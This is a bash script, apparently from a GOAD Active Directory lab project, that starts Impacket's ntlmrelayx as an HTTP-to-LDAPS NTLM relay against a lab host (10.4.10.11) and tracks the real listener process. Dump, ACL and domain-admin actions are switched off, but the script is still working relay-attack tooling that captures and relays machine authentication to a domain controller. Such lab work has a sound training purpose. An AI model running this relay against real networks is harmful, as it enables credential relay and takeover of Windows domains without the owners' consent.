#!/usr/bin/env bash
# Start a mutation-disabled HTTP -> LDAPS relay for deterministic WS01 machine authentication.
# Track the real listener PID rather than the transient sudo/stdbuf wrapper.
set -euo pipefail

ROOT="${ROOT:-$HOME/Documents/GOAD_NOMAD}"
TARGET="${TARGET:-10.4.10.11}"
WORK="${WORK:-$HOME/.config/kingdoms/phase03-http-ldaps}"
LOG="$WORK/ntlmrelayx.log"
PIDFILE="$WORK/ntlmrelayx.pid"

find_ntlmrelayx() {
  local c
  for c in     "$(command -v impacket-ntlmrelayx 2>/dev/null || true)"     "$(command -v ntlmrelayx.py 2>/dev/null || true)"     /usr/share/doc/python3-impacket/examples/ntlmrelayx.py; do
    [[ -n "$c" && ( -f "$c" || -x "$c" ) ]] || continue
    printf '%s\n' "$c"
    return 0
  done
  return 1
}

listener_pid_80() {
  sudo ss -H -lntp 'sport = :80' 2>/dev/null     | sed -n 's/.*pid=\([0-9][0-9]*\).*/\1/p'     | head -n1
}

pid_cmdline() {
  local pid="$1"
  sudo sh -c "tr '\\0' ' ' < /proc/$pid/cmdline" 2>/dev/null || true
}

cd "$ROOT"

bash "$ROOT/scripts/phase03/check-http-ldaps-readonly-relay.sh"

NTLMRELAYX="$(find_ntlmrelayx)"
sudo -v

umask 077
rm -rf -- "$WORK"
mkdir -p "$WORK"

sudo -n stdbuf -oL -eL "$NTLMRELAYX"   -t "ldaps://$TARGET"   --no-dump   --no-da   --no-acl   --no-smb-server   --no-wcf-server   --no-raw-server   >"$LOG" 2>&1 &

LAUNCH_PID=$!

REAL_PID=""
for _ in {1..20}; do
  REAL_PID="$(listener_pid_80 || true)"
  if [[ -n "$REAL_PID" ]]; then
    CMDLINE="$(pid_cmdline "$REAL_PID")"
    if grep -Eqi 'ntlmrelayx' <<<"$CMDLINE"; then
      break
    fi
    REAL_PID=""
  fi

  if ! kill -0 "$LAUNCH_PID" 2>/dev/null; then
    # The sudo/stdbuf wrapper may legitimately exit after handing off.
    :
  fi

  sleep 0.5
done

if [[ -z "$REAL_PID" ]]; then
  echo 'FAIL: could not identify the ntlmrelayx process owning TCP/80' >&2
  cat "$LOG" >&2
  exit 1
fi

CMDLINE="$(pid_cmdline "$REAL_PID")"
grep -Eqi 'ntlmrelayx' <<<"$CMDLINE" || {
  echo "FAIL: TCP/80 PID $REAL_PID is not ntlmrelayx: $CMDLINE" >&2
  exit 1
}

sudo kill -0 "$REAL_PID" 2>/dev/null || {
  echo "FAIL: ntlmrelayx listener PID $REAL_PID is not alive" >&2
  cat "$LOG" >&2
  exit 1
}

printf '%s\n' "$REAL_PID" >"$PIDFILE"

echo "TARGET=ldaps://$TARGET"
echo "LOG=$LOG"
echo "PID=$REAL_PID"
echo "CMDLINE=$CMDLINE"
echo 'PHASE03_HTTP_LDAPS_RUNTIME_READY=True'
